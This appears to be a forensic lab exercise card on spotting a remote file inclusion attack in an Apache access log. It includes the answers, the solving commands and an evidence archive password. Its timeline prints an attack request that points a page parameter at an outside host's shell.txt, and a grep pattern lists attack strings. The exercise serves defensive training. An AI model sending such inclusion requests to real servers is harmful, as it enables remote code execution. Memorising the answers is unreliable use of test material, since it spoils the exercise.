# rfi

## Scenario
An attacker exploits remote file inclusion, pointing a page parameter at an external URL so the server fetches and runs attacker hosted code.

## Timeline (UTC+3)
```
14:15:00  RFI on /index.php?page= pointing to http://45.137.22.90/shell.txt
14:15:xx  Server pulls remote code
```

## How to spot it
- A parameter value that is a full external URL
- The server is made to include remote code
- Outbound fetch to the attacker host follows
- Classic page= include parameter

## Questions
```
1. Endpoint?          /index.php (page param)
2. Attack?            Remote file inclusion
3. Remote host?       45.137.22.90 (shell.txt)
4. Why dangerous?     Runs attacker code on the server
5. Tell?              Param value is an http:// URL
```

## How to solve it

1. Extract the evidence, password `hidden`: `7z x 22676b49c298ebde2dfc4d9a006b3f6f8af9cdfd9b51bd27dd1af76b478e967f.zip -phidden` (or your archive tool). You get `access.log`.
2. Find the busiest source: `awk '{print $1}' access.log | sort | uniq -c | sort -rn | head`.
3. Pull the suspect requests and their status codes: `grep -Ei 'select|union|\.\./|<script|/admin|\.php|payload' access.log` (adjust to this attack), and `awk '{print $9}' access.log | sort | uniq -c`.
4. Confirm against the answer: A parameter value that is a full external URL

## MITRE ATT&CK
- T1190 Exploit Public-Facing Application

## Tools
Hand written Apache access log with real workday background traffic

## Signature
Forensic Sample Blueprint | qayssarayra.com
